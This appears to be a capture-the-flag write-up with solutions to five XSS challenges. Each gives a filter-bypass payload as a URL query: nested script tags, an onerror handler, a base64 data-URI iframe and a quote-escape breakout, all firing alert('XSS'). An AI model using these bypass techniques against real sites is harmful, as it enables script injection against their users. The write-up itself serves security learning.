# XSS 1
`/xss1?name=hacker<<sscript>alert("XS"%2B"S")<<//script>`

# XSS 2
There have been many people wondering about their not working solutions with backticks (`).
The point here is, that the backend phantomjs engine has not implemented the new ECMAScript specification.
But the most browsers have, so you can get an alert, but the backend is not aware of that!
(I would not classify this as a bug, because the source code tells us, that they use phantomjs and we can read
on github, that the latest stable version is 2.1. The new specification is expected to be released with version 2.5 - regardless of when that should be released...)

So I think that the expected solution should look like this:
`/xss2?name=hacker%27%20onerror=%27window.onerror=alert;throw%20%22XSS%22%27`

# XSS 3
`/xss3?name="><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=`

# XSS 4
For XSS 4 we can use JSFuck.
You can find the payload in this directory.

# XSS 5
`/xss5?name=\";alert(unescape(/%2558%2553%2553/.source));//`